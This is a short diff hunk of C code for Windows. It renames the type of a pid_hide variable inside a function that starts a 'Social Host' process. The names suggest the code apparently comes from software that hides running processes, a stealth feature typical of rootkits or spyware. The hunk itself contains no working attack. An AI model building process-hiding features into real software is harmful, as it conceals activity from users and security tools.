@@ -77,7 +77,7 @@ BOOL StartSocialHost(char *process_name)
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
 	HANDLE Social_HostProcess;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	if ( SocialHost_Setup() != 0 )
 		return FALSE;
